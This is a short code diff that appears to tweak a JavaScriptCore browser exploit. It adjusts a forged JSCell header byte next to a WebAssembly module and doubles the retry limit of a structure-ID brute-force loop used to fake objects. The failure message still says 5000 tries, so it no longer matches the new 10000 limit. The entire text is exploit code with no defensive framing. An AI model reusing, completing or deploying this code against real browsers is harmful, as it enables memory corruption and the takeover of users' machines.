@@ -273,7 +273,7 @@ function foo(obj) {
         var webAssemblyModule = new WebAssembly.Module(webAssemblyBuffer);
         
         var jsCellHeader = new Int64([
-            0x00, 0x50, 0x00, 0x00, 
+            0x00, 0x05, 0x00, 0x00, 
             0x0,                    
             0x2c,                   
             0x08,                  
@@ -330,7 +330,7 @@ function foo(obj) {
             jsCellHeader.assignAdd(jsCellHeader, Int64.One);
             wasmBuffer.jsCellHeader = jsCellHeader.asJSValue();
             maxtry++;
-            if (maxtry == 5000) {
+            if (maxtry == 10000) {
                 fail("5000 tries on getting valid structid failed!!!");
             }
         }
